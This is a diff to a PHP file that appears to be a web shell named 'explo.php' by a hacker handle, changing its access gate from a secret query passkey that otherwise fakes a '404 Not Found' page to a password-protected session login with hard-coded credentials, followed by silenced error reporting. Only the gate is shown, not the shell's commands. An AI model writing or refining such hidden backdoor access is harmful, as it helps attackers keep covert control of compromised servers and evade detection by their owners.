@@ -1,13 +1,27 @@
 <?php
-/**
- * by 0x6ick  : 6ickZone | Copyright 2025 by t.me/Yungx6ick
- */
+session_start();
 
-$passkey = '6z'; //explo.php?k=6z
+if (isset($_GET['logout'])) {
+    unset($_SESSION['gits_login']);
+    header('Location: ?');
+    exit;
+}
 
-if (!isset($_REQUEST['k']) || $_REQUEST['k'] !== $passkey) {
-    http_response_code(404);
-    exit('404 Not Found');
+if (!isset($_SESSION['gits_login'])) {
+    if (isset($_POST['pass']) && $_POST['pass'] === '6host') { // default : 6host
+        $_SESSION['gits_login'] = true;
+        header("Location: ?");
+        exit;
+    } else {
+        echo '<style>
+            body{background:#0d1117;color:#00ffff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}
+            form{border:1px solid #00ffff;padding:20px;}
+            input{background:#222;color:#00ffff;border:1px solid #00ffff;padding:5px;}
+            ::placeholder{color:#00ffff66}
+        </style>';
+        echo '<form method="POST"><input type="password" name="pass" placeholder="Enter Password"><input type="submit" value="Login"></form>';
+        exit;
+    }
 }
 
 @error_reporting(0);
